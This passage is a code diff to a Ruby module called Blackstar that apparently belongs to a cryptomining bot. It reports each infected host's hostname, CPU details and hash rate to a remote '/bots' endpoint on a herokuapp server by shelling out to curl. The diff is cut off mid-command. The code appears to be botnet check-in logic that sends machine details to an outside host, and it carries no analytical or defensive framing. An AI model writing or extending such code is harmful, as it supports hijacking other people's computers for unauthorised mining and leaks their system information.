@@ -1,24 +1,31 @@
 module Blackstar
   class Report
     REPORT_URL = 'http://blackstar07.herokuapp.com/bots'
-    attr_reader :host
+    attr_reader :host, :platform
 
-    def initialize(host)
+    def initialize(host, platform)
       @host = host
+      @platform = platform
     end
 
     def report(hash_rate)
-      p "Mining at - #{hash_rate}"
+      if platform == :linux
+        report_linux(hash_rate)
+      end
+    end
+
+    def report_linux(hash_rate)
       headers = {
           'name' => host.hostname,
           'version' => Blackstar::VERSION,
           'hashrate' => hash_rate,
           'cpu_info' => host.processor
       }
-      make_request(headers)
+      p "Mining at - #{hash_rate} - #{headers}"
+      make_request_linux(headers)
     end
 
-    def make_request(headers)
+    def make_request_linux(headers)
       Cmd.call <<-SH
 curl --header "Content-Type: application/json" \
   --request POST \
